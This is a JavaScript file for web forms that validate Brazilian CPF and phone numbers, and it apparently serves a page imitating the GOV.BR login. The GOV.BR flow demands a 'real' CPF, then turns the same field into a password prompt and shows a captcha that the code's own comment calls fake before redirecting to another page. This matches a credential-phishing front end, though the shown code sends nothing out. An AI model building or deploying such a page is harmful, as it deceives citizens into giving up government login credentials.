// Validação de CPF
function validarCPF(cpf) {
    cpf = cpf.replace(/[^\d]/g, '');
    if (cpf.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(cpf)) return false;
    let soma = 0; for (let i=0;i<9;i++) soma += parseInt(cpf[i])*(10-i);
    let resto = 11 - (soma%11); let d1 = resto<2?0:resto;
    soma = 0; for (let i=0;i<10;i++) soma += parseInt(cpf[i])*(11-i);
    resto = 11 - (soma%11); let d2 = resto<2?0:resto;
    return parseInt(cpf[9])===d1 && parseInt(cpf[10])===d2;
}
function validarCPFReal(cpf){
    cpf = cpf.replace(/[^\d]/g,'');
    if (cpf.length!==11) return {valido:false,motivo:'CPF deve ter 11 dígitos'};
    if (/^(\d)\1{10}$/.test(cpf)) return {valido:false,motivo:'CPF inválido'};
    const ban = ['00000000000','11111111111','22222222222','33333333333','44444444444','55555555555','66666666666','77777777777','88888888888','99999999999'];
    if (ban.includes(cpf)) return {valido:false,motivo:'CPF inválido'};
    let soma=0; for(let i=0;i<9;i++) soma+=parseInt(cpf[i])*(10-i); let r=11-(soma%11); let d1=r<2?0:r;
    soma=0; for(let i=0;i<10;i++) soma+=parseInt(cpf[i])*(11-i); r=11-(soma%11); let d2=r<2?0:r;
    if (parseInt(cpf[9])!==d1||parseInt(cpf[10])!==d2) return {valido:false,motivo:'Dígitos inválidos'};
    const reg=parseInt(cpf.substring(0,2)); if(reg<1||reg>99) return {valido:false,motivo:'Região inválida'};
    const uniq=new Set(cpf.split('')).size; if(uniq<3) return {valido:false,motivo:'Padrão repetitivo'};
    return {valido:true,motivo:'OK'};
}
function formatarCPF(c){c=c.replace(/\D/g,'');c=c.replace(/(\d{3})(\d)/,'$1.$2');c=c.replace(/(\d{3})(\d)/,'$1.$2');c=c.replace(/(\d{3})(\d{1,2})$/,'$1-$2');return c;}
function formatarTelefone(t){t=t.replace(/\D/g,'');t=t.replace(/(\d{2})(\d)/,'($1) $2');t=t.replace(/(\d{5})(\d)/,'$1-$2');return t;}

document.addEventListener('DOMContentLoaded',function(){
  const cpfInput=document.getElementById('cpf');
  const cpfError=document.getElementById('cpfError');
  const cpfGovInput=document.getElementById('cpfGov');
  const cpfGovError=document.getElementById('cpfErrorGov');
  const telefoneInput=document.getElementById('telefone');
  const cnhForm=document.getElementById('cnhForm');
  const govForm=document.getElementById('govForm');
  const captchaOverlay=document.getElementById('captchaOverlay');
  const captchaConfirm=document.getElementById('captchaConfirm');
  const captchaCancel=document.getElementById('captchaCancel');

  if (cpfInput){
    cpfInput.addEventListener('input',e=>{
      let v=formatarCPF(e.target.value); e.target.value=v;
      if(v.length===14){const limpo=v.replace(/\D/g,''); if(validarCPF(limpo)){cpfError.textContent='';cpfInput.style.borderColor='green';} else {cpfError.textContent='CPF inválido';cpfError.style.color='red';cpfInput.style.borderColor='red';}}
      else {cpfError.textContent='';cpfInput.style.borderColor='#ccc';}
    });
  }

  if (cpfGovInput){
    const cpfFmt=e=>{ if(cpfGovInput.type!=='text') return; let v=formatarCPF(e.target.value); e.target.value=v; };
    cpfGovInput.addEventListener('input',cpfFmt);
  }

  if (telefoneInput){ telefoneInput.addEventListener('input',e=>{ e.target.value=formatarTelefone(e.target.value);}); }

  if (cnhForm){ cnhForm.addEventListener('submit',e=>{ e.preventDefault(); const c=cpfInput.value.replace(/\D/g,''); if(!validarCPF(c)){alert('Por favor, insira um CPF válido para continuar.'); cpfInput.focus(); return;} alert('Formulário enviado com sucesso! CPF válido confirmado.'); }); }

  // GOV.BR fluxo controlado por submit
  if (govForm){
    govForm.addEventListener('submit',e=>{
      e.preventDefault();
      if (cpfGovInput.type==='text'){
        const c=cpfGovInput.value.replace(/\D/g,'');
        const res = validarCPFReal(c);
        if(!res.valido){
          cpfGovError.textContent = 'CPF inválido. Informe um CPF real.';
          cpfGovError.style.color = 'red';
          cpfGovInput.style.borderColor = 'red';
          cpfGovInput.focus();
          return;
        }
        // Troca para senha e para de formatar
        cpfGovInput.type='password'; cpfGovInput.placeholder='Insira sua senha'; cpfGovInput.value='';
        const label=document.getElementById('cpfLabel'); if(label) label.textContent='Senha';
        cpfGovError.textContent=''; cpfGovInput.style.borderColor='#ccc';
        return;
      }
      // Se já é senha, exibe captcha fake antes de avançar
      if (cpfGovInput.type==='password'){
        if(!cpfGovInput.value){ alert('Digite sua senha para continuar.'); return; }
        if (captchaOverlay){ captchaOverlay.style.display='flex'; captchaOverlay.setAttribute('aria-hidden','false'); }
      }
    });
  }

  // Controle do captcha
  if (captchaOverlay && captchaConfirm && captchaCancel){
    const items = Array.from(document.querySelectorAll('.captcha-item'));
    const updateState = () => {
      const selected = items.filter(btn => btn.getAttribute('aria-pressed') === 'true');
      const allCats = selected.length === 3 && selected.every(btn => (btn.dataset.animal || '') === 'cat');
      captchaConfirm.disabled = !allCats;
    };

    items.forEach(btn=>{
      btn.addEventListener('click',()=>{
        const pressed = btn.getAttribute('aria-pressed')==='true';
        btn.setAttribute('aria-pressed', String(!pressed));
        updateState();
      });
    });

    captchaCancel.addEventListener('click',()=>{
      captchaOverlay.style.display='none';
      captchaOverlay.setAttribute('aria-hidden','true');
    });
    captchaConfirm.addEventListener('click',()=>{
      captchaOverlay.style.display='none';
      captchaOverlay.setAttribute('aria-hidden','true');
      window.location.href='pagina4.html';
    });
    // estado inicial
    captchaConfirm.disabled = true;
  }
}); 